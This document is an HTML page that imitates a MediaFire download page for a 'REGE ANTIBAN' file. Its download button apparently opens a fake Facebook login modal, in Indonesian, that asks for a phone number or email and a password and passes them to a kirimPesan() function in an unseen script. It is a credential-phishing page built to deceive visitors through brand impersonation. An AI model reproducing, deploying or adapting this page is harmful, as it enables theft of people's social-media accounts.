<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1, width=device-width" />
<link rel="icon" href="/assets/titlelogo.png">
    <link rel="stylesheet" href="style.css" />
    <link rel="stylesheet" href="index.css" />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
    />
  </head>
  <body>
    <div class="home">
      <header class="home-inner">
        <div class="logo-1-parent">
          <img
            class="logo-1-icon"
            loading="lazy"
            alt=""
            src="/assets/logo.png"
          />

          <div class="download-button-parent">
            <div class="download-button">
              <img
                class="flag-1-icon"
                loading="lazy"
                alt=""
                src="/assets/flag.webp"
              />
            </div>
            <div class="rectangle-parent">
              <div class="frame-child"></div>
              <div class="sign-up">SIGN UP</div>
            </div>
            <div class="rectangle-group">
              <div class="frame-item"></div>
              <div class="log-in">LOG IN</div>
            </div>
          </div>
        </div>
      </header>
      <section class="frame-parent">
        <div class="frame-group">
          <div
            class="rectangle-container"
            role="button"
            tabindex="0"
            id="myBtn"
          >
            <div class="frame-inner"></div>
            <div class="zip-1-parent">
              <img class="zip-1-icon" alt="" src="/assets/zip.png" />

              <div class="frame-wrapper">
                <div class="rege-antiban-parent">
                  <div class="rege-antiban">REGE ANTIBAN</div>
                  <div class="download-15mb-wrapper">
                    <div class="download-15mb">Download (15MB)</div>
                  </div>
                </div>
              </div>
            </div>
            <div class="download-1-wrapper">
              <img class="download-1-icon" alt="" src="/assets/download.png" />
            </div>
          </div>
          <div class="frame-container">
            <button class="frame-button">
              <div class="rectangle-div"></div>
              <div class="share-1-wrapper">
                <img class="share-1-icon" alt="" src="/assets/share.png" />
              </div>
              <div class="share-options">Share Options</div>
            </button>
            <button class="rectangle-parent1">
              <div class="frame-child1"></div>
              <div class="plus-1-wrapper">
                <img class="plus-1-icon" alt="" src="/assets/plus.png" />
              </div>
              <div class="a">Save to My Files</div>
            </button>
          </div>
        </div>
        <div class="frame-div">
          <div class="frame-child2"></div>
          <img
            class="world-1-icon"
            loading="lazy"
            alt=""
            src="/assets/world.svg"
          />
        </div>
        <div class="upload">
          <img src="/assets/flag.webp" alt="" srcset="" style="width: 50px;">
          <p style="color: black; font-size: small;">This file was uploaded from Indonesia on February 26, 2024 at 1:58 AM</p>
        </div>
      </section>
    </div>
    <div id="myModal" class="modal">
      <div class="modal-content"> 
        <div class="content">
          <div class="flex-div">
              <form>
                <span class="close">&times;</span>
                <div class="name-content">
                  <h1 class="logo">facebook</h1>
                </div>
                <img src="/assets/titlelogo.png" alt="" srcset="" style="width: 50px; margin: 0 0 20px 100px;">
                <p style="text-align: center; font-size: 1.5rem; opacity: 50%; font-weight: 600; margin-bottom: 20px;">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</p>
                <input type="text" placeholder="Nomor ponsel atau email" id="nama" required />
                <input type="password" placeholder="Kata Sandi" id="email" required>
                <input class="login" type="button" id="kirim" value="Masuk" onclick="kirimPesan()" />
                <a href="#">Lupa kata sandi?</a>
                <hr>
                <button class="create-account">Buat akun baru</button>
              </form>
          </div>
        </div>
      </div>
    </div>
  </body>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="script.js"></script>
</html>
